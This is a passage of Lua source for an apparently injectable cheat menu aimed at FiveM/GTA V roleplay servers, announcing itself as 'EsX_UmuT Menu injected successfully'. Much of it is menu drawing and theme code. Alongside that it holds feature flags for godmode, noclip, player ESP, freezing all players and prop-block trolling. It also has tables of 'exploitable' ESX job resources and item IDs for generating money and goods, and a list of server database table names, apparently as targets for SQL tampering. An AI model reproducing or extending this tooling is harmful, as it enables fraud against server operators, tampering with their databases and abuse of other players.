		Aldoportu.debugPrint(tostring(text)..' checkbox changed to '..tostring(checked))
		if callback then callback(checked) end

		return true
	end

	return false
end

function Aldoportu.comboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == (Aldoportu.menuProps.optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = '« '..tostring(selectedItem)..' »'
	end

	if Aldoportu.button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.left then
			if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
		elseif Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.right then
			if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function Aldoportu.comboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == (Aldoportu.menuProps.optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if Aldoportu.button3(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end

function Aldoportu.drawButton3(text, items, itemsCount, currentIndex)
	local x = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width / 2
	local multiplier = nil

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount and Aldoportu.menuProps.optionCount <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount then
		multiplier = Aldoportu.menuProps.optionCount
	elseif Aldoportu.menuProps.optionCount > Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption - Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount and Aldoportu.menuProps.optionCount <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption then
		multiplier = Aldoportu.menuProps.optionCount - (Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption - Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].y + Aldoportu.menuProps.titleHeight + Aldoportu.menuProps.buttonHeight + (Aldoportu.menuProps.buttonHeight * multiplier) - Aldoportu.menuProps.buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local rectBackgroundColor = nil
		local rectBackgroundLine = nil
		local shadow = false

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount then
			backgroundColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuFocusBackgroundColor
			textColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuFocusTextColor
			subTextColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuFocusTextColor
			rectBackgroundColor = { r = Aldoportu.mainColor.r, g = Aldoportu.mainColor.g, b = Aldoportu.mainColor.b, a = 255 }
			rectBackgroundLine = { r = Aldoportu.mainColor.r, g = Aldoportu.mainColor.g, b = Aldoportu.mainColor.b, a = 255 }
		else
			backgroundColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuBackgroundColor
			textColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuTextColor
			subTextColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuSubTextColor
			rectBackgroundColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuTextColor
			rectBackgroundLine = {r = 155, g = 155, b = 155, a = 150}
			shadow = true
		end

        local sliderWidth = ((Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width / 3) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.16
        local stabilizer = 1

        --[[ Draw order from top to bottom]]
        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        Aldoportu.drawRect(x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.buttonHeight, backgroundColor) --[[ Button Rectangle -2.15]]
        Aldoportu.drawRect(((Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1) + 0.001, Aldoportu.menuProps.buttonHeight / 2 + 0.002, rectBackgroundLine)
        Aldoportu.drawRect(((Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), Aldoportu.menuProps.buttonHeight / 2, {r = 10, g = 10, b = 10, a = 150})
        Aldoportu.drawRect(((Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + 0.1675) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), Aldoportu.menuProps.buttonHeight / 2, rectBackgroundColor)
        Aldoportu.drawText(text, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, textColor, Aldoportu.menuProps.buttonScale, false, shadow)

        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1650
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1625
        elseif string.len(CurrentItem) == 3 then XOffset = 0.16015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1585
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1570
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1555
		end
		
        Aldoportu.drawText(items[currentIndex], ((Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + XOffset) + 0.04) / stabilizer, y - (Aldoportu.menuProps.buttonHeight / 2.15) + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, {r = 255, g = 255, b = 255, a = 255}, Aldoportu.menuProps.buttonScale, false, shadow) --[[ Current Item Text]]
	
		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount and Aldoportu.menuProps.menu_RectOverlay then
			if not HasStreamedTextureDictLoaded('deadline') then Aldoportu.natives.requestStreamedTextureDict('deadline', true) end
			DrawSprite('deadline', 'deadline_trail_01', x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.buttonHeight, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 55)
		end
	end
end

function Aldoportu.button3(text, items, itemsCount, currentIndex)
	local buttonText = text

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		Aldoportu.menuProps.optionCount = Aldoportu.menuProps.optionCount + 1

		local isCurrent = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount

		Aldoportu.drawButton3(text, items, itemsCount, currentIndex)

		if isCurrent then
			if Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.select then
				Aldoportu.natives.playSoundFrontend(-1, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.name, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.set, true)
				Aldoportu.debugPrint(buttonText..' button pressed')
				return true
			elseif Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.left or Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.right then
				Aldoportu.natives.playSoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			end
		end

		return false
	else
		Aldoportu.debugPrint('Failed to create '..buttonText..' button: '..tostring(Aldoportu.menuProps.currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Aldoportu.runDrawMenu()
	if Aldoportu.isMenuVisible(Aldoportu.menuProps.currentMenu) then
		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].aboutToBeClosed then
			Aldoportu.closeMenu()
		else
			ClearAllHelpMessages()

			Aldoportu.drawTitle()
			Aldoportu.drawSubTitle()

			Aldoportu.menuProps.currentKey = nil

			if IsDisabledControlJustReleased(1, Aldoportu.menuProps.keys.down) then
				Aldoportu.natives.playSoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)

				if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption < Aldoportu.menuProps.optionCount then
					Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption + 1
				else
					Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustReleased(1, Aldoportu.menuProps.keys.up) then
				Aldoportu.natives.playSoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)

				if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption > 1 then
					Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption - 1
				else
					Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption = Aldoportu.menuProps.optionCount
				end
			elseif IsDisabledControlJustReleased(1, Aldoportu.menuProps.keys.left) then
				Aldoportu.menuProps.currentKey = Aldoportu.menuProps.keys.left
			elseif IsDisabledControlJustReleased(1, Aldoportu.menuProps.keys.right) then
				Aldoportu.menuProps.currentKey = Aldoportu.menuProps.keys.right
			elseif IsDisabledControlJustReleased(1, Aldoportu.menuProps.keys.select) then
				Aldoportu.menuProps.currentKey = Aldoportu.menuProps.keys.select
			elseif IsDisabledControlJustReleased(1, Aldoportu.menuProps.keys.back) then
				if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].previousMenu] then
					Aldoportu.natives.playSoundFrontend(-1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
					Aldoportu.setMenuVisible(Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].previousMenu, true)
				else
					Aldoportu.closeMenu()
				end
			end

			Aldoportu.menuProps.optionCount = 0
		end
	end
end
function Aldoportu.setMenuWidth(id, width)
	Aldoportu.setMenuProperty(id, 'width', width)
end

function Aldoportu.setMenuX(id, x)
	Aldoportu.setMenuProperty(id, 'x', x)
end

function Aldoportu.setMenuY(id, y)
	Aldoportu.setMenuProperty(id, 'y', y)
end

function Aldoportu.setMenuMaxOptionCountOnScreen(id, count)
	Aldoportu.setMenuProperty(id, 'maxOptionCount', count)
end

function Aldoportu.setTitle(id, title)
	Aldoportu.setMenuProperty(id, 'title', title)
end

function Aldoportu.setTitleColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].titleColor.a })
end

function Aldoportu.setTitleBackgroundColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].titleBackgroundColor.a })
end

function Aldoportu.setTitleBackgroundSprite(id, textureDict, textureName)
	Aldoportu.natives.requestStreamedTextureDict(textureDict)
	Aldoportu.setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
end

function Aldoportu.setTitleBackgroundSpriteNil(id)
	Aldoportu.setMenuProperty(id, 'titleBackgroundSprite', nil)
end

function Aldoportu.setSubTitle(id, text)
	Aldoportu.setMenuProperty(id, 'subTitle', text)
end

function Aldoportu.setMenuBackgroundColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].menuBackgroundColor.a })
end
function Aldoportu.setMenuSubTitleBackgroundColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'subTitleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].subTitleBackgroundColor.a })
end

function Aldoportu.setMenuTextColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].menuTextColor.a })
end

function Aldoportu.setMenuSubTextColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].menuSubTextColor.a })
end

function Aldoportu.setMenuFocusTextColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'menuFocusTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].menuFocusTextColor.a })
end

function Aldoportu.setMenuFocusColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].menuFocusColor.a })
end

function Aldoportu.setMenuButtonPressedSound(id, name, set)
	Aldoportu.setMenuProperty(id, 'buttonPressedSound', { ['name'] = name, ['set'] = set })
end

function Aldoportu.setFont(id, font)
	Aldoportu.menuProps.buttonFont = font
	Aldoportu.menuProps.shitMenus[id].titleFont = font
end
local _be_aN = be_aN
function Aldoportu.setMaxOptionCount(id, count)
	Aldoportu.setMenuProperty(id, 'maxOptionCount', count)
end

function Aldoportu.setMenuFocusBackgroundColor(id, r, g, b, a)
	Aldoportu.setMenuProperty(id, 'menuFocusBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or Aldoportu.menuProps.shitMenus[id].menuFocusBackgroundColor.a})
end

pCreateThread(function()
	--[[Handle rainbow theme]]
	while Aldoportu.shouldShowMenu do pWait(0)
		Aldoportu.menuProps.rainbowInt = Aldoportu.trashFunctions.returnRGB(0.2)
		if Aldoportu.menuProps.selectedThemeRainbow then
			Aldoportu.mainColor = {
				r = Aldoportu.menuProps.rainbowInt.r, 
				g = Aldoportu.menuProps.rainbowInt.g, 
				b = Aldoportu.menuProps.rainbowInt.b,
				a = 255
			}
		end
	end
end)
function Aldoportu.setTheme(id)
	if Aldoportu.menuProps.selectedTheme == 'Light' then
		Aldoportu.mainColor = {
			r = 89, 
			g = 173, 
			b = 218,
			a = 255
		}
		Aldoportu.setTitleBackgroundSprite(id, 'commonmenu', 'interaction_bgd')
		Aldoportu.setMenuBackgroundColor(id, 45, 45, 45, 225)
		Aldoportu.setMenuFocusBackgroundColor(id, 25, 25, 25, 225)
		Aldoportu.setMenuSubTitleBackgroundColor(id, 0, 0, 0, 255)
		Aldoportu.setTitleBackgroundColor(id, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
		Aldoportu.setTitleColor(id, 255, 255, 255, 255)
		Aldoportu.setMenuTextColor(id, 150, 150, 150)
		Aldoportu.setMenuFocusTextColor(id, 175, 175, 175, 255)
		Aldoportu.setMenuSubTextColor(id, 155, 155, 155, 225)
		Aldoportu.setFont(id, 4)
		Aldoportu.setMenuX(id, 0.025)
		Aldoportu.setMenuY(id, 0.3)
		Aldoportu.setMenuWidth(id, 0.25)
		Aldoportu.setMaxOptionCount(id, Aldoportu.menuProps.maximumOptionCount)
		
		Aldoportu.menuProps.titleHeight = 0.0525
		Aldoportu.menuProps.titleXOffset = 0.15
		Aldoportu.menuProps.titleYOffset = 0.00485
		Aldoportu.menuProps.titleScale = 0.7
		Aldoportu.menuProps.titleSpacing = 2.0
		Aldoportu.menuProps.buttonHeight = 0.035
		Aldoportu.menuProps.buttonScale = 0.360
		Aldoportu.menuProps.buttonTextXOffset = 0.003
		Aldoportu.menuProps.buttonTextYOffset = 0.0025

		Aldoportu.menuTabsColors = {
			selfOptions = {r=255, g=255, b=255},
			onlineOptions = {r=255, g=255, b=255},
			visualOptions = {r=255, g=255, b=255},
			teleportOptions = {r=255, g=255, b=255},
			vehicleOptions = {r=255, g=255, b=255},
			weaponOptions = {r=255, g=255, b=255},
			serverOptions = {r=255, g=255, b=255},
			menuOptions = {r=255, g=255, b=255}
		}
	elseif Aldoportu.menuProps.selectedTheme == 'Dark' then
		Aldoportu.mainColor = {
			r = 225, 
			g = 55, 
			b = 55,
			a = 255
		}
		Aldoportu.setTitleBackgroundSprite(id, 'shopui_title_sm_hangar', 'shopui_title_sm_hangar')
		--[[Aldoportu.setTitleBackgroundSpriteNil(id)]]
		Aldoportu.setMenuBackgroundColor(id, 25, 25, 25, 225)
		Aldoportu.setMenuFocusBackgroundColor(id, 50, 50, 50, 230)
		Aldoportu.setMenuSubTitleBackgroundColor(id, 35, 35, 35, 255)
		Aldoportu.setTitleBackgroundColor(id, 15, 15, 15, 255)
		Aldoportu.setTitleColor(id, 135, 135, 135, 255)
		Aldoportu.setMenuTextColor(id, 150, 150, 150)
		Aldoportu.setMenuFocusTextColor(id, 155, 155, 155, 255)
		Aldoportu.setMenuSubTextColor(id, 70, 70, 70, 255)
		Aldoportu.setFont(id, 4)
		Aldoportu.setMenuX(id, 0.025)
		Aldoportu.setMenuY(id, 0.3)
		Aldoportu.setMenuWidth(id, 0.25)
		Aldoportu.setMaxOptionCount(id, Aldoportu.menuProps.maximumOptionCount)
		
		Aldoportu.menuProps.titleHeight = 0.0525
		Aldoportu.menuProps.titleXOffset = 0.15
		Aldoportu.menuProps.titleYOffset = 0.00485
		Aldoportu.menuProps.titleScale = 0.7
		Aldoportu.menuProps.titleSpacing = 2.0
		Aldoportu.menuProps.buttonHeight = 0.035
		Aldoportu.menuProps.buttonScale = 0.360
		Aldoportu.menuProps.buttonTextXOffset = 0.003
		Aldoportu.menuProps.buttonTextYOffset = 0.0025

		Aldoportu.menuTabsColors = {
			selfOptions = {r=255, g=255, b=255},
			onlineOptions = {r=255, g=255, b=255},
			visualOptions = {r=255, g=255, b=255},
			teleportOptions = {r=255, g=255, b=255},
			vehicleOptions = {r=255, g=255, b=255},
			weaponOptions = {r=255, g=255, b=255},
			serverOptions = {r=255, g=255, b=255},
			menuOptions = {r=255, g=255, b=255}
		}
	elseif Aldoportu.menuProps.selectedTheme == 'Classic' then
		Aldoportu.mainColor = {
			r = 105, 
			g = 55, 
			b = 255,
			a = 255
		}
		Aldoportu.setTitleBackgroundSpriteNil(id)
		Aldoportu.setMenuBackgroundColor(id, 25, 25, 25, 225)
		Aldoportu.setMenuFocusBackgroundColor(id, 50, 50, 50, 230)
		Aldoportu.setMenuSubTitleBackgroundColor(id, 35, 35, 35, 255)
		Aldoportu.setTitleBackgroundColor(id, 15, 15, 15, 255)
		Aldoportu.setTitleColor(id, 135, 135, 135, 255)
		Aldoportu.setMenuTextColor(id, 150, 150, 150)
		Aldoportu.setMenuFocusTextColor(id, 155, 155, 155, 255)
		Aldoportu.setMenuSubTextColor(id, 70, 70, 70, 255)
		Aldoportu.setFont(id, 4)
		Aldoportu.setMenuX(id, 0.025)
		Aldoportu.setMenuY(id, 0.3)
		Aldoportu.setMenuWidth(id, 0.25)
		Aldoportu.setMaxOptionCount(id, 12)
		
		Aldoportu.menuProps.titleHeight = 0.0525
		Aldoportu.menuProps.titleXOffset = 0.15
		Aldoportu.menuProps.titleYOffset = 0.00485
		Aldoportu.menuProps.titleScale = 0.7
		Aldoportu.menuProps.titleSpacing = 2.0
		Aldoportu.menuProps.buttonHeight = 0.035
		Aldoportu.menuProps.buttonScale = 0.360
		Aldoportu.menuProps.buttonTextXOffset = 0.003
		Aldoportu.menuProps.buttonTextYOffset = 0.0025

		Aldoportu.menuTabsColors = {
			selfOptions = {r=26, g=288, b=156},
			onlineOptions = {r=52, g=152, b=219},
			visualOptions = {r=236, g=240, b=241},
			teleportOptions = {r=241, g=196, b=15},
			vehicleOptions = {r=230, g=126, b=34},
			weaponOptions = {r=231, g=76, b=60},
			serverOptions = {r=155, g=89, b=182},
			menuOptions = {r=155, g=89, b=182}
		}
	end
end

function Aldoportu.initTheme()
	for i = 1, #Aldoportu.menus_list do
		Aldoportu.setTheme(Aldoportu.menus_list[i], Aldoportu.menuProps.selectedTheme)
	end
end

--[[
	Notifications system
]]

Aldoportu.addNotification = function(text, ms)
    table.insert(Aldoportu.cachedNotifications, { ['text'] = text, ['time'] = ms, ['startTime'] = GetGameTimer() })
end

Aldoportu.removeNotification = function(id)
    table.remove(Aldoportu.cachedNotifications, id)
end

Aldoportu.draw_3D = function(x, y, text, opacity)
    if opacity > 255 then
        opacity = 255
    elseif opacity < 0 then
        opacity = 0
    end

	Aldoportu.natives.setTextScale(0.35, 0.35)
	if Aldoportu.menuProps.menu_TextDropShadow then
		Aldoportu.natives.setTextDropShadow(0, 0, 0, 0,255)
	end
	SetTextEdge(2, 0, 0, 0, 255)
	if Aldoportu.menuProps.menu_TextOutline then
		Aldoportu.natives.setTextOutline()
	end
    Aldoportu.natives.setTextFont(4)
    Aldoportu.natives.setTextProportional(1)
    Aldoportu.natives.setTextColour(255, 255, 255, math.floor(opacity))
    Aldoportu.natives.beginTextCommandDisplayText('STRING')
    SetTextCentre(1)
    Aldoportu.natives.addTextComponentSubstringPlayerName(text)
    Aldoportu.natives.endTextCommandDisplayText(x, y)
    
    local factor = string.len(text) / 300
    
    Aldoportu.natives.drawRect(x, y + 0.0135, 0.0155 + factor, 0.03, 25, 25, 25, opacity)
    Aldoportu.natives.drawRect(x, y + 0.0125, 0.015 + factor, 0.03, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, opacity)
end

Aldoportu.pushNotification = function(text, ms)
	if text then
		if not ms then ms = 5000 end
        Aldoportu.addNotification(text, ms)
    end
end

Aldoportu.pushNotification('EsX_UmuT Menu injected successfully', 5000)
Aldoportu.pushNotification('EsX_UmuT', 10000)

Aldoportu.storedControls = {
	--[[Self Opts]]
	godmode = false,
	semiGodmode = false,
	infStamina = false,
	neverWanted = false,
	noClip = false,
	invisible = false,
	bInvisible = false,
	noRagdoll = false,
	superJump = false,
	magnetoMode = false,
	heatVision = false,
	nightVision = false,
	tinyPlayer = false,
	bTinyPlayer = false,
	flashmanSP = false,

	--[[Vehicle Opts]]
	vehGodmode = false,
	veh2Step = false,
	vehRainbowCol = false,
	vehRainbowLights = false,
	vehWallride = false,
	vehSpawnUpgraded = false,
	vehSpawnInside = true,
	vehAlwaysWheelie = false,
	vehDriftSmoke = false,
	currentDisappearFromChase = 1,
	selectedDisappearFromChase = 1,

	--[[Weapon Opts]]
	weapSpawnAsPickup = false,
	weapExplosiveAmmo = false,
	weapCustomBullet = false,
	weaponsDamageMultiplier = {1.0, 2.0, 3.0, 5.0, 10.0, 25.0, 50.0, 250.0, 1000.0},
	weaponsDamageMultiplierCurrent = 1,
	weaponsDamageMultiplierSelected = 1,
	weaponsDamageMultiplierSet = 1,
	weaponsGiveAmmoCurrent = 1,
	weaponsGiveAmmoSelected = 1,

	--[[Visual Opts]]
	visPlayerBlips = false,
	visForceRadar = false,
	visForceGamertags = false,
	visForceThirdperson = false,
	visESPEnable = false,
	visESPShowID = false,
	visESPShowName = false,
	visESPShowDistance = false,
	visESPShowWeapon = false,
	visESPShowVehicle = false,
	visDrawFPS = false,
	visualsESPRefreshRate = 0,
	visualsESPRefreshRates = {'0ms', '50ms', '150ms', '250ms', '500ms', '1s', '2s', '5s'},
	visualsESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0},
	visualsESPDistance = 500.0,
	currentVisualsESPDistance = 1,
	selectedVisualsESPDistance = 1,
	currentESPRefreshIndex = 1,
	selectedESPRefreshIndex = 1,

	--[[Teleport Opts]]
	teleShowCoords = false,
	currentTeleportToOptions = 1,
	selectedTeleportToOptions = 1,

	--[[Single Player Opts]]
	sPOIsSpectating = false,
	sPOFlingPlayer = false,
	sPOFlingedPlayer = nil,
	spectatedPlayer = nil,
	sPOShootAtOptionsCurrent = 1,
	sPOShootAtOptionsSelected = 1,

	--[[All Players Opts]]
	aPOFlyingCars = false,
	aPOFreeze = false,
	aPODisableDrivingCars = false,
	aPONoisyVehs = false,
}
Aldoportu.menuTables = {
	weaponsCustomBullet = {
		current = 1,
		selected = 1,
		actual = 1,
		words = {'RPG', 'Firework', 'Flare', 'Tracer Rocket', 'Tank Rocket'},
		lists = {'WEAPON_RPG', 'WEAPON_FIREWORK', 'WEAPON_FLAREGUN', 'VEHICLE_WEAPON_PLAYER_LASER', 'VEHICLE_WEAPON_TANK'}
	},
	vehiclePerformanceTable = {
		{ name = 'Engine', id = 11 },
		{ name = 'Brakes', id = 12 },
		{ name = 'Transmission', id = 13 },
		{ name = 'Suspension', id = 15 },
		{ name = 'Armour', id = 16 }
	},
	serverKashactersSQL = {
		current = 1,
		selected = 1,
		actual = 1,
		words = {'User Inventory', 'Owned Vehicles', 'Bills', 'Shops', 'Characters', 'Vehicles'},
		lists = {'user_inventory', 'owned_vehicles', 'billing', 'shops', 'characters', 'vehicles'}
	},
	trollsPropBlock = {
		current = 1,
		selected = 1,
		words = {'Legion Square', 'MRPD', 'PDM'}
	},
	exploitableJobsTable = {
		'Unemployed',
		'Mechanic',
		'Police',
		'Ambulance',
		'Taxi',
		'Real Estate Agent',
		'Car Dealer',
		'Banker',
		'Gang',
		'Mafia',
	},
	customExploitableItems = {},
}

Aldoportu.menuTables.exploitableJobsTable.Item = {
	'Butcher', 'Tailor', 'Miner', 'Fueler', 'Lumberjack', 'Fisher', 'Hunting', 'Weed', 'Meth', 'Coke', 'Opium'
}
Aldoportu.menuTables.exploitableJobsTable.ItemDatabase = {
	['Butcher']         = oTable.new{ 'Alive Chicken', 'alive_chicken', 'Slaughtered Chicken', 'slaughtered_chicken', 'Packaged Chicken', 'packaged_chicken' },
	['Tailor']          = oTable.new{ 'Wool', 'wool', 'Fabric', 'fabric', 'Clothes', 'clothe' },
	['Fueler']          = oTable.new{ 'Petrol', 'petrol', 'Refined Petrol', 'petrol_raffin', 'Essence', 'essence' },
	['Miner']           = oTable.new{ 'Stone', 'stone', 'Washed Stone', 'washed_stone', 'Diamond', 'diamond' },
	['Lumberjack']      = oTable.new{ 'Wood', 'wood', 'Cutted Wood', 'cutted_wood', 'Packed Plank', 'packaged_plank' },
	['Fisher']          = oTable.new{ 'Fish', 'fish' },
	['Hunting']         = oTable.new{ 'Meat', 'meat'},
	['Coke']            = oTable.new{ 'Coke', 'coke', 'Coke Bag', 'coke_pooch' },
	['Weed']            = oTable.new{ 'Weed', 'weed', 'Weed Bag', 'weed_pooch' },
	['Meth']            = oTable.new{ 'Meth', 'meth', 'Meth Bag', 'meth_pooch' },
	['Opium']           = oTable.new{ 'Opium', 'opium', 'Opium Bag', 'opium_pooch' },
}
Aldoportu.menuTables.exploitableJobsTable.ItemRequires = {
	['Fabric']          = 'Wool',
	['Clothes']         = 'Fabric',
	['Washed Stone']    = 'Stone',
	['Diamond']         = 'Washed Stone',
	['Coke Bag']        = 'coke',
	['Weed Bag']        = 'weed',
	['Meth Bag']        = 'meth',
	['Opium Bag']       = 'opium'
}
Aldoportu.menuTables.exploitableJobsTable.Money = {
	'Fuel Delivery',
	'Car Thief',
	'DMV School',
	'Dirty Job',
	'Pizza Boy',
	'Ranger Job',
	'Garbage Job',
	'Car Thief',
	'Trucker Job',
	'Postal Job',
	'Banker Job',
}
Aldoportu.menuTables.exploitableJobsTable.Money.Value = {
	'esx_fueldelivery',
	'esx_carthief',
	'esx_dmvschool',
	'esx_godirtyjob',
	'esx_pizza',
	'esx_ranger',
	'esx_garbagejob',
	'esx_carthief',
	'esx_truckerjob',
	'esx_gopostaljob',
	'esx_banksecurity'
}

--[[
	Add variables here for magic.
]]

local be_aN2 = 'number'

Aldoportu.keyBinds = {
	currentKeybindMenu = {
		label = 'Menu',
		handle = 'F3',
	},
	currentKeybindHealth = {
		label = 'Re-fill Health',
		handle = nil,
	},
	currentKeybindArmour = {
		label = 'Re-fill Armour',
		handle = nil,
	},
	currentKeybindNoclip = {
		label = 'Toggle Noclip',
		handle = nil,
	},
	currentKeybindMagneto = {
		label = 'Toggle Magneto',
		handle = nil,
	},
}

local currentCustomCrosshair = 1
